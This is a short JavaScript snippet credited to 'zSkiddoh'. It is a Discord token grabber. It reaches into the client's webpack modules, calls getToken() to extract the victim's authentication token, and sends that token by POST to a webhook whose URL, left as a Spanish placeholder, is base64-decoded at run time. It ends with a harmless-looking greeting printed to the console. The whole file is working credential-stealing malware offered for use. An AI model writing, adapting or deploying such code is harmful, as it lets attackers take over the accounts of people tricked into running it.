//Made By zSkiddoh
//Date Creation: 28/11/2021

var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[["extra_id"]]]); for (let e in req.c)
 if (req.c.hasOwnProperty(e)) {
 let t = req.c[e].exports;
 if (t && t.__esModule && t.default)
 for (let e in t.default) "getToken" === e && (skiddoh_grabber = t.default.getToken())
    }

fetch(
  atob('AQUÍ LA URL DE LA WEBHOOK EN BASE64'), 
  {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: skiddoh_grabber,
    }),
  }
);

console.log('¡Hola!')
